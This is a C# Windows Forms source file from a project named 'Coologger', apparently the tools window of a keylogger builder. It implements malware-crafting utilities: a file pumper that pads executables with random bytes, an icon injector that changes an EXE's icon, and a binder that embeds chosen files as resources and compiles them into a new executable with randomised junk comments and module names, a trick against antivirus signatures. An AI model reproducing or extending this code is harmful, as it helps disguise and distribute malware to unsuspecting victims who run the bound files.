using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Resources;
using System.Text;
using System.Windows.Forms;
using System.IO;
using Microsoft.VisualBasic;

namespace Coologger
{
    public partial class ToolForm : Form
    {
        private byte[] fileData;
       private string code = null;
        private Random rand = new Random();
       
        
        public ToolForm()
        {
            InitializeComponent();
        }

        #region Singleton
        static ToolForm _Instance = null;
        static readonly object PadLock = new object();

        public static ToolForm Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _Instance ?? (_Instance = new ToolForm());
                }
            }
        }
        #endregion

        private void PictureBox4_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void tools_Load(object sender, EventArgs e)
        {
            code = RichTextBox1.Text;
        }

        private void FButton2_Click(object sender, EventArgs e)
        {
            OpenFileDialog pumpfile = new OpenFileDialog();
            if (pumpfile.ShowDialog() == DialogResult.OK)
                TextBox5.Text = pumpfile.FileName;
        }

        private void FButton1_Click(object sender, EventArgs e)
        {
            try
            {
                decimal Amount = 0;
                switch (ComboBox2.SelectedIndex)
                {
                    case 0:
                        Amount = NumericUpDown1.Value;
                        break;
                    case 1:
                        Amount = NumericUpDown1.Value * 1024;
                        break;
                    case 2:
                        Amount = (NumericUpDown1.Value * 1024) * 1024;
                        break;
                }
                int BytesWritten = 0;
                Random r = new Random();
                byte[] data = new byte[1];
                FileStream fs = new FileStream(TextBox5.Text, FileMode.Append);
                for (int i = 0; i <= Amount - 1; i++)
                {
                    r.NextBytes(data);
                    fs.WriteByte(data[0]);
                    BytesWritten++;
                    Application.DoEvents();
                }
                MessageBox.Show("File pumped");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to pump: " + ex.Message);
            }
        }

        private void FButton3_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileopen = new OpenFileDialog();
            if (fileopen.ShowDialog() == DialogResult.OK)
            {
                TextBox3.Text = fileopen.FileName;
            }
        }

        private void FButton5_Click(object sender, EventArgs e)
        {
            try
            {
                IconInjector.InjectIcon(TextBox3.Text, TextBox4.Text);
                MessageBox.Show("Icon Changed");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: Unable to change icon: " + ex.Message);
            }
        }

        private void AddFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "All Files *.*|*.*";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                fileList2.Items.Add(ofd.FileName);
            }
        }

        string ReadFile(string filename)
        {
            string filedata = null;
            FileSystem.FileOpen(5, filename, OpenMode.Binary, OpenAccess.Read, OpenShare.Default);
            filedata = Strings.Space(Convert.ToInt32(FileSystem.LOF(5)));
            FileSystem.FileGet(5, ref filedata, -1, false);
            FileSystem.FileClose(5);
            return filedata;

        }

        private void BindToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            try
            {
                sfd.Filter = "EXE Files *.exe|*.exe";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    ResourceWriter R = new ResourceWriter(Application.StartupPath + "\\Meth.resources");
                    for (int i = 0; i <= fileList2.Items.Count - 1; i++)
                    {
                        FileInfo oFile = new FileInfo(fileList2.Items[i].ToString());
                        FileStream oFileStream = oFile.OpenRead();
                        long lBytes = oFileStream.Length;

                        if (lBytes > 0)
                        {
                            fileData = new byte[lBytes];
                            oFileStream.Read(fileData, 0, (int)lBytes);
                            oFileStream.Close();
                        }
                        R.AddResource(Path.GetFileName(fileList2.Items[i].ToString()), Convert.ToBase64String(fileData));
                    }
                    code = code.Replace("%mod%", "Module m" + Util.randomString(rand.Next(5, 10)));

                    for (int i = 1; i <= 18; i++)
                    {
                        code = code.Replace("%junk" + i + "%", "'" + Util.randomString(rand.Next(15, 50)));
                    }
                    Compile(code, sfd.FileName, true, "");

                    if (File.Exists(Application.StartupPath + "\\Meth.resources"))
                    {
                        File.Delete(Application.StartupPath + "\\Meth.resources");
                    }
                    MessageBox.Show("Files Binded");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to bind: " + ex.Message);
            }
        }

        private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            fileList2.Items.Clear();
        }

        private void DeleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            while (fileList2.SelectedItems.Count > 0)
                fileList2.Items.Remove(fileList2.SelectedItem);
        }

        void Compile(string Code, string Path, bool FormProgram, string MainClass)
        {
            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");
            VBCodeProvider CodeProvider = new VBCodeProvider(providerOptions);
            CompilerParameters Parameters = new CompilerParameters();
            Parameters.GenerateExecutable = true;
            Parameters.OutputAssembly = Path;
            if (FormProgram) Parameters.CompilerOptions = "/target:winexe";
            Parameters.MainClass = MainClass;
            Parameters.IncludeDebugInformation = false;
            Parameters.ReferencedAssemblies.Add("System.dll");
            Parameters.ReferencedAssemblies.Add("System.Data.dll");
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            Parameters.ReferencedAssemblies.Add("System.XML.dll");
            Parameters.EmbeddedResources.Add(Application.StartupPath + "\\Meth.resources");

            CompilerResults Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code);
            if (Results.Errors.Count > 0)
            {
                foreach (CompilerError E in Results.Errors)
                {
                    MessageBox.Show(E.ErrorText);
                }
            }
        }

    }
}
